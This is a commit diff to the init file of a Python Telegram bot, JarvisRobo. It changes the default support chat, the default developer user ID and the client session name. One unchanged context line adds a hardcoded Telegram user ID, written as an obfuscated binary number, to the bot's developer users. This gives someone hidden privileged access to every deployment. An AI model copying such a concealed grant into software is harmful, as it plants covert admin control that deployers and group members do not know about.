8d2cbb7a0ab0d5d0797d99885019d2997735f976
RAJNISH XD <155803358+doraemon890@users.noreply.github.com>
2024-04-02 10:11:48 +0530

    Update __init__.py

--- JarvisRobo/__init__.py
+++ JarvisRobo/__init__.py
@@ -49,7 +49,7 @@ if ENV:
         "START_IMG", ""
     )
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "worldwide_friend_zone")
+    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "Chatting_2024")
     TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
     TOKEN = os.environ.get("TOKEN", None)
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
@@ -67,7 +67,7 @@ if ENV:
 
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "2145093972").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "7157587567").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
@@ -149,7 +149,7 @@ DEV_USERS.add(abs(0b101100001110010100011000111101001))
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("mukesh", API_ID, API_HASH)
+telethn = TelegramClient("jarvis", API_ID, API_HASH)
 
 pbot = Client("JarvisRobo", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN,in_memory=True)
 dispatcher = updater.dispatcher
